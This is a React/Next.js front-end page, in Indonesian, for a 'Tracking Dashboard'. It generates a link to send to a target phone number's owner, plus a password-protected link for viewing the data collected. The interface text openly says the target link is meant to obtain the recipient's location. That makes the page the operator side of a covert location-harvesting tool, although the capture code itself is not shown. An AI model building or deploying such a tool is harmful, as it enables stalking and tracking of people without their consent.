'use client'

import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Label } from '@/components/ui/label'
import { Copy, Check, Link2, Eye, MapPin } from 'lucide-react'

interface TrackingResult {
  id: string
  linkTarget: string
  linkView: string
}

export default function HomePage() {
  const [nomorTarget, setNomorTarget] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState<TrackingResult | null>(null)
  const [copiedTarget, setCopiedTarget] = useState(false)
  const [copiedView, setCopiedView] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!nomorTarget.trim()) {
      setError('Nomor target wajib diisi')
      return
    }

    setLoading(true)
    setError('')
    setResult(null)

    try {
      const res = await fetch('/api/tracking', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ nomor_target: nomorTarget })
      })

      const data = await res.json()

      if (!res.ok) {
        throw new Error(data.error || 'Gagal membuat tracking')
      }

      setResult(data.data)
      setNomorTarget('')
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Terjadi kesalahan')
    } finally {
      setLoading(false)
    }
  }

  const copyToClipboard = async (text: string, type: 'target' | 'view') => {
    const fullUrl = `${window.location.origin}${text}`
    await navigator.clipboard.writeText(fullUrl)
    if (type === 'target') {
      setCopiedTarget(true)
      setTimeout(() => setCopiedTarget(false), 2000)
    } else {
      setCopiedView(true)
      setTimeout(() => setCopiedView(false), 2000)
    }
  }

  return (
    <main className="min-h-screen flex items-center justify-center p-4 bg-muted/30">
      <div className="w-full max-w-lg space-y-6">
        <div className="text-center space-y-2">
          <div className="flex items-center justify-center gap-2">
            <MapPin className="h-8 w-8 text-primary" />
            <h1 className="text-3xl font-bold">Tracking Dashboard</h1>
          </div>
          <p className="text-muted-foreground">
            Buat link tracking untuk mendapatkan informasi lokasi
          </p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Link2 className="h-5 w-5" />
              Buat Link Tracking
            </CardTitle>
            <CardDescription>
              Masukkan nomor target untuk membuat link tracking baru
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="nomor_target">Nomor Target</Label>
                <Input
                  id="nomor_target"
                  type="text"
                  placeholder="Masukkan nomor target..."
                  value={nomorTarget}
                  onChange={(e) => setNomorTarget(e.target.value)}
                  disabled={loading}
                />
              </div>
              {error && (
                <p className="text-sm text-destructive">{error}</p>
              )}
              <Button type="submit" className="w-full" disabled={loading}>
                {loading ? 'Membuat...' : 'Buat Link Tracking'}
              </Button>
            </form>
          </CardContent>
        </Card>

        {result && (
          <Card className="border-primary/20 bg-primary/5">
            <CardHeader>
              <CardTitle className="text-lg">Link Berhasil Dibuat!</CardTitle>
              <CardDescription>
                Gunakan link berikut untuk tracking
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label className="flex items-center gap-2 text-sm font-medium">
                  <Link2 className="h-4 w-4" />
                  Link Target
                </Label>
                <div className="flex items-center gap-2">
                  <Input
                    readOnly
                    value={`${typeof window !== 'undefined' ? window.location.origin : ''}${result.linkTarget}`}
                    className="bg-background font-mono text-sm"
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="icon"
                    onClick={() => copyToClipboard(result.linkTarget, 'target')}
                  >
                    {copiedTarget ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
                <p className="text-xs text-muted-foreground">
                  Kirim link ini ke target untuk mendapatkan lokasi mereka
                </p>
              </div>

              <div className="space-y-2">
                <Label className="flex items-center gap-2 text-sm font-medium">
                  <Eye className="h-4 w-4" />
                  Link View
                </Label>
                <div className="flex items-center gap-2">
                  <Input
                    readOnly
                    value={`${typeof window !== 'undefined' ? window.location.origin : ''}${result.linkView}`}
                    className="bg-background font-mono text-sm"
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="icon"
                    onClick={() => copyToClipboard(result.linkView, 'view')}
                  >
                    {copiedView ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
                <p className="text-xs text-muted-foreground">
                  Gunakan link ini untuk melihat data tracking (memerlukan password)
                </p>
              </div>
            </CardContent>
          </Card>
        )}

      </div>
    </main>
  )
}
